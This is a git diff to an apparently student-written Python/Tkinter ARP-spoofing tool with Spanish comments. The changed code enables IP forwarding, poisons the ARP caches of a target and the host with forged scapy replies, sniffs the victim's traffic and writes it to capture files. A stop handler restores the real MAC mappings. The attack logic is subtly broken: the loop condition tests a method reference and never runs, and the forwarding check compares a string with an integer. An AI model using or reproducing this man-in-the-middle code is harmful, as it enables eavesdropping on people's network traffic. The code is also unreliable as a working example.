@@ -113,58 +113,98 @@ class App:
         self.cont=280
 
     def GButton_797_command(self):
+        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
         target=self.targetip.get()
         output = self.output.get()
         verbose = self.verbose
-        
+        #Se llama a la funcion habilitar_ruta()
+        self.habilitar_ruta(verbose)
+        #Hatsa que no se pulse el boton de parar no cesara el ataque
+        while not self.GButton_798_command:
+            self.ataque(target,self.ip_host,verbose)
+            #Hacemos sniff de los paquetes que esta enviando la victima durante 30 segundos
+            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(30))
+            #Printeamos el resumen de la captura por terminal
+            print(self.capture.summary())
+            #Se crea el archivo del output si se especifica y se escribe en el la informacion de los paquetes
+            if output is not None:
+                wrpcap("App/rastreo_output/{}.cap".format(output),self.capture)
+            self.ataque(self.ip_host,target,verbose)
+            #Hacemos sniff de los paquetes que esta enviando la victima durante 30 segundos
+            self.capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(30))
+            #Printeamos el resumen de la captura por terminal
+            print(self.capture.summary())
+            #Se crea el archivo del output si se especifica y se escribe en el la informacion de los paquetes
+            if output is not None:
+                wrpcap("App/rastreo_output/{}.cap".format(output),self.capture)
+            time.sleep(1)
+        #Se despliega en la ventana el resumen de la captura de los paquetes
+        label = tk.Label(root,text=str(self.capture),fg="green",bg="black",justify="center")
+        label.place(x=30,y=self.cont,width=530,height=20)
+        self.cont=self.cont+20
+    def ataque(self,target,ip_host,verbose):
+        # Aqui llamamos a la funcion get_mac()
         mac_victima=self.get_mac(target)
+        #Mediante la funcion ARP de scapy preparamos la respuesta ARP y la enviamos 
         respuesta_arp=ARP(pdst=target,hwdst=mac_victima,psrc=self.ip_host,op='is-at')
         send(respuesta_arp,verbose=0)
         if verbose:
+            #Definimos nuestra mac
             mac_host = ARP().hwsrc
-            print("[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host))
-            label = tk.Label(root,text="[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host),fg="yellow",bg="black",justify="center")
-            label.place(x=30,y=self.cont,width=530,height=20)
-            self.cont=self.cont+20
-            print("PAQUETES CAPTURADOS")
-            capture = sniff(filter=f"ip src host {target} or ip src host {self.ip_host}",timeout=int(2))
-            print(capture.summary())
-            wrpcap("App/rastreo_output/{}.cap".format(output),capture)
-            label = tk.Label(root,text=str(capture),fg="green",bg="black",justify="center")
+            #Seguimiento desde la terminal de la respuesta ARP
+            print("[+] Enviado a {} : {} is-at {}".format(target, ip_host, mac_host))
+            #Desplegamos un Label que contenga el mensaje de la respuesta ARP en la ventana
+            label = tk.Label(root,text="[+] Enviado a {} : {} is-at {}".format(target, ip_host, mac_host),fg="yellow",bg="black",justify="center")
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
 
+            print("PAQUETES CAPTURADOS")
+        
+
     def GButton_798_command(self):
+        # Aqui declaramos las variables que recibiran los valores que se introduciran en los inputs de la ventana
         target=self.targetip.get()
         verbose = self.verbose
         mac_victima=self.get_mac(target)
         mac_host=self.get_mac(self.ip_host)
+        #Aqui se especifica mediante el protocolo ARP las direccions MAC e IP normales y donde les corresponden
         respuesta_arp=ARP(pdst=target,hwdst=mac_victima,psrc=self.ip_host,hwsrc=mac_host,op='is-at')
         send(respuesta_arp,verbose=0,count=7)
+        respuesta_arp2=ARP(pdst=self.ip_host,hwdst=mac_host,psrc=target,hwsrc=mac_victima,op='is-at')
+        send(respuesta_arp2,verbose=0,count=7)
         if verbose:
+            #Seguimiento desde la terminal de la respuesta ARP
             print("[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host))
+            #Desplegamos un Label que contenga el mensaje de la respuesta ARP en la ventana
             label = tk.Label(root,text="[+] Enviado a {} : {} is-at {}".format(target, self.ip_host, mac_host),fg="yellow",bg="black",justify="center")
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
     def get_mac(self,ip):
+        #Mediante las funciones de scapy srp Ether y ARP obtenemos la maci de la IP que especificamos
         ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
         if ans:
             return ans[0][1].src
     def habilitar_ruta(self,verbose=True):
+        #Aqui habilitamos la ruta para poder realizar el ataque
         if verbose:
+            #Printeando por terminal y ventana que se a habilitado la ruta IP
             print("Habilitando la ruta ip")
             label = tk.Label(root,text="Habilitando la ruta IP",fg="yellow",bg="black",justify="center")
             label.place(x=30,y=self.cont,width=530,height=20)
             self.cont=self.cont+20
+            #Si nuestro sistema operativo es windows mediante una funcion python que importamos desde la carpeta python
+            #se habilita la ruta IP
             if "nt" in os.name:
                 service = WService("RemoteAccess")
                 service.start()
+            #Si el sistema operativo es linux accedemos al archivo_ip con el que podremos habilitar la ruta
             else:
                 archivo_ip="/proc/sys/net/ipv4/ip_forward"
                 with open(archivo_ip) as fichero:
                     if not fichero.read() == 1:
                         with open(archivo_ip, "w") as fichero:
                             print(1, file=fichero)
+        #Una vez habilitamos la ruta IP se printea por terminal y ventana
         if verbose:
             print("La ruta ip se ha habilitado")
             label = tk.Label(root,text="La ruta IP se ha habilitado",fg="gren",bg="black",justify="center")
